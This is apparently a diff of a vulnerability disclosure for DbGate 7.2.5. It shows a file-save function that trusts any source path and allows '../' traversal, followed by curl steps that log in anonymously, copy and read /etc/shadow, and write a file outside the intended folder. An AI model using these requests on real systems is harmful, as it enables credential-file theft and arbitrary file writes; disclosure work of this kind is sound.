@@ -22,14 +22,14 @@ In `packages/api/src/controllers/files.js`:
 ```javascript
 saveUploadedFile_meta: true,
 async saveUploadedFile({ filePath, fileName }) {
-    const FOLDERS = ['sql', 'sqlite'];
-    for (const folder of FOLDERS) {
-        if (fileName.toLowerCase().endsWith('.' + folder)) {
-            await fs.copyFile(filePath, path.join(filesdir(), folder, fileName));
-            // filePath: arbitrary source (no validation)
-            // fileName: can contain ../ for target traversal
-        }
-    }
+ const FOLDERS = ['sql', 'sqlite'];
+ for (const folder of FOLDERS) {
+ if (fileName.toLowerCase().endsWith('.' + folder)) {
+ await fs.copyFile(filePath, path.join(filesdir(), folder, fileName));
+ // filePath: arbitrary source (no validation)
+ // fileName: can contain ../ for target traversal
+ }
+ }
 }
 ```
 
@@ -46,17 +46,17 @@ Verified on DbGate 7.2.5 Docker (default anonymous deployment, port 3000):
 
 ```bash
 curl -s -X POST http://TARGET:3000/auth/login \
-  -H "Content-Type: application/json" \
-  -d '{"amoid":"none"}'
+ -H "Content-Type: application/json" \
+ -d '{"amoid":"none"}'
 ```
 
 **Step 2: Copy `/etc/shadow` into accessible directory (arbitrary file read)**
 
 ```bash
 curl -s -X POST http://TARGET:3000/files/save-uploaded-file \
-  -H "Authorization: Bearer <JWT>" \
-  -H "Content-Type: application/json" \
-  -d '{"filePath":"/etc/shadow","fileName":"shadow.sql"}'
+ -H "Authorization: Bearer <JWT>" \
+ -H "Content-Type: application/json" \
+ -d '{"filePath":"/etc/shadow","fileName":"shadow.sql"}'
 ```
 ```
 {"name":"shadow","folder":"sql"}
@@ -66,9 +66,9 @@ curl -s -X POST http://TARGET:3000/files/save-uploaded-file \
 
 ```bash
 curl -s -X POST http://TARGET:3000/files/load \
-  -H "Authorization: Bearer <JWT>" \
-  -H "Content-Type: application/json" \
-  -d '{"folder":"sql","file":"shadow.sql","format":"text"}'
+ -H "Authorization: Bearer <JWT>" \
+ -H "Content-Type: application/json" \
+ -d '{"folder":"sql","file":"shadow.sql","format":"text"}'
 ```
 ```
 root:*:20668:0:99999:7:::
@@ -82,9 +82,9 @@ node:!:20670:0:99999:7:::
 
 ```bash
 curl -s -X POST http://TARGET:3000/files/save-uploaded-file \
-  -H "Authorization: Bearer <JWT>" \
-  -H "Content-Type: application/json" \
-  -d '{"filePath":"/root/.dbgate/uploads/testfile","fileName":"../../../../tmp/evil_trav.sql"}'
+ -H "Authorization: Bearer <JWT>" \
+ -H "Content-Type: application/json" \
+ -d '{"filePath":"/root/.dbgate/uploads/testfile","fileName":"../../../../tmp/evil_trav.sql"}'
 ```
 ```
 {"name":"travtest","folder":"sql"}
